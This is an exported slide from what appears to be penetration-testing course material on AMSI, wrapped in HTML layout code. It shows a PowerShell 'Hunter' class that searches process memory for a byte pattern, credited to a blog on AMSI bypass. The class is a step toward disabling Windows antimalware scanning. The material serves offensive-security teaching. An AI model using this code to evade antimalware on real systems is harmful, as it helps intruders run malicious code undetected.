(function(){var loadHandler=window['sl_{9B7E1ACD-FE32-41D7-8304-031CE5D38424}'];loadHandler&&loadHandler(43, '<div id="spr0_928d9"><div id="spr1_928d9" class="kern slide"><img id="img2_928d9" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_928d9" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_928d9" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt0_928d9" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_928d9" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_928d9" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt1_928d9" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr5_928d9" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt2_928d9" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 4, Module 1 - Caendra Inc. © 2020</span></div></div><div id="svg5_928d9" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl4_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg8_928d9" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr6_928d9" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl5_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt3_928d9" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl6_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg9_928d9" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_928d9" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl7_928d9" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt4_928d9" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_928d9" class="kern slide"><div id="spr8_928d9" style="left:34.91px;top:115.643px;"><div style="width:0px;"><span id="txt5_928d9" data-width="788.531250" style="left:9.6px;top:4.99px;">The class Hunter can be used in the PowerShell code to</span></div><div style="width:0px;"><span id="txt6_928d9" data-width="632.578125" style="left:9.6px;top:43.39px;">find an egg starting from a memory address.</span></div></div><div id="spr9_928d9" style="left:63.75px;top:201px;"><div style="width:0px;"><span id="txt7_928d9" class="nokern" data-width="89.614586" style="left:20.444px;top:17.155px;">Class Hunter {</span></div><div style="width:0px;"><span id="txt8_928d9" class="nokern" data-width="422.468750" style="left:20.444px;top:32.346px;">    static [IntPtr] FindAddress ([IntPtr]$address, [byte[]]$egg) {</span></div><div style="width:0px;"><span id="txt9_928d9" class="nokern" data-width="147.223969" style="left:20.444px;top:47.706px;">        while ($true) {</span></div><div style="width:0px;"><span id="txt10_928d9" class="nokern" data-width="172.828125" style="left:20.444px;top:63.066px;">            [int]$count = 0</span></div><div style="width:0px;"><span id="txt11_928d9" class="nokern" data-width="172.828125" style="left:20.444px;top:93.786px;">            while ($true) {</span></div><div style="width:0px;"><span id="txt12_928d9" class="nokern" data-width="390.463562" style="left:20.444px;top:109.146px;">                [IntPtr]$address = [IntPtr]::Add($address, 1)</span></div><div style="width:0px;"><span id="txt13_928d9" class="nokern" data-width="665.708374" style="left:20.444px;top:124.506px;">                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {</span></div><div style="width:0px;"><span id="txt14_928d9" class="nokern" data-width="179.229172" style="left:20.444px;top:139.866px;">                    $count++</span></div><div style="width:0px;"><span id="txt15_928d9" class="nokern" data-width="313.651062" style="left:20.444px;top:155.226px;">                    If ($count -eq $egg.Length) {</span></div><div style="width:0px;"><span id="txt16_928d9" class="nokern" data-width="486.479187" style="left:20.444px;top:170.586px;">                        return [IntPtr]::Subtract($address, $egg.Length - 1)</span></div><div style="width:0px;"><span id="txt17_928d9" class="nokern" data-width="134.421875" style="left:20.444px;top:185.946px;">                    }</span></div><div style="width:0px;"><span id="txt18_928d9" class="nokern" data-width="204.833344" style="left:20.444px;top:201.306px;">                } Else { break }</span></div><div style="width:0px;"><span id="txt19_928d9" class="nokern" data-width="83.213547" style="left:20.444px;top:216.666px;">            }</span></div><div style="width:0px;"><span id="txt20_928d9" class="nokern" data-width="57.609375" style="left:20.444px;top:232.026px;">        }</span></div><div style="width:0px;"><span id="txt21_928d9" class="nokern" data-width="147.223969" style="left:20.444px;top:247.386px;">        return $address</span></div><div style="width:0px;"><span id="txt22_928d9" class="nokern" data-width="32.005211" style="left:20.444px;top:262.746px;">    }</span></div><div style="width:0px;"><span id="txt23_928d9" class="nokern" style="left:20.444px;top:278.106px;">}</span></div></div><div id="spr10_928d9" style="left:63.75px;top:201px;"><img id="img0_928d9" src="data/img29.png" width="840" height="307.5" alt=""/></div><div id="spr11_928d9" style="left:63.75px;top:201px;"><div style="width:0px;"><span id="txt24_928d9" class="nokern" data-width="89.614586" style="left:17.616px;top:14.327px;">Class Hunter {</span></div><div style="width:0px;"><span id="txt25_928d9" class="nokern" data-width="422.468750" style="left:17.616px;top:29.517px;">    static [IntPtr] FindAddress ([IntPtr]$address, [byte[]]$egg) {</span></div><div style="width:0px;"><span id="txt26_928d9" class="nokern" data-width="147.223969" style="left:17.616px;top:44.877px;">        while ($true) {</span></div><div style="width:0px;"><span id="txt27_928d9" class="nokern" data-width="172.828125" style="left:17.616px;top:60.237px;">            [int]$count = 0</span></div><div style="width:0px;"><span id="txt28_928d9" class="nokern" data-width="172.828125" style="left:17.616px;top:90.957px;">            while ($true) {</span></div><div style="width:0px;"><span id="txt29_928d9" class="nokern" data-width="390.463562" style="left:17.616px;top:106.317px;">                [IntPtr]$address = [IntPtr]::Add($address, 1)</span></div><div style="width:0px;"><span id="txt30_928d9" class="nokern" data-width="665.708374" style="left:17.616px;top:121.677px;">                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {</span></div><div style="width:0px;"><span id="txt31_928d9" class="nokern" data-width="179.229172" style="left:17.616px;top:137.037px;">                    $count++</span></div><div style="width:0px;"><span id="txt32_928d9" class="nokern" data-width="313.651062" style="left:17.616px;top:152.397px;">                    If ($count -eq $egg.Length) {</span></div><div style="width:0px;"><span id="txt33_928d9" class="nokern" data-width="486.479187" style="left:17.616px;top:167.757px;">                        return [IntPtr]::Subtract($address, $egg.Length - 1)</span></div><div style="width:0px;"><span id="txt34_928d9" class="nokern" data-width="134.421875" style="left:17.616px;top:183.117px;">                    }</span></div><div style="width:0px;"><span id="txt35_928d9" class="nokern" data-width="204.833344" style="left:17.616px;top:198.477px;">                } Else { break }</span></div><div style="width:0px;"><span id="txt36_928d9" class="nokern" data-width="83.213547" style="left:17.616px;top:213.837px;">            }</span></div><div style="width:0px;"><span id="txt37_928d9" class="nokern" data-width="57.609375" style="left:17.616px;top:229.197px;">        }</span></div><div style="width:0px;"><span id="txt38_928d9" class="nokern" data-width="147.223969" style="left:17.616px;top:244.557px;">        return $address</span></div><div style="width:0px;"><span id="txt39_928d9" class="nokern" data-width="32.005211" style="left:17.616px;top:259.917px;">    }</span></div><div style="width:0px;"><span id="txt40_928d9" class="nokern" style="left:17.616px;top:275.277px;">}</span></div></div><img id="img1_928d9" src="data/img19.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:265.194px;"/><div id="spr12_928d9" style="left:33.966px;top:503.833px;"><div style="width:0px;"><span id="txt41_928d9" class="nokern" data-width="337.078125" style="left:9.6px;top:7.881px;">Source code: https://www.contextis.com/en/blog/amsi-bypass</span></div></div><div id="spr13_928d9" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt42_928d9" class="nokern" data-width="36.692707" style="left:9.6px;top:4.798px;">|  p.44</span></div></div><div id="spr14_928d9" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt43_928d9" data-width="160.160812" style="left:9.6px;top:27.438px;">1.2 AMSI</span></div></div></div></div>');})();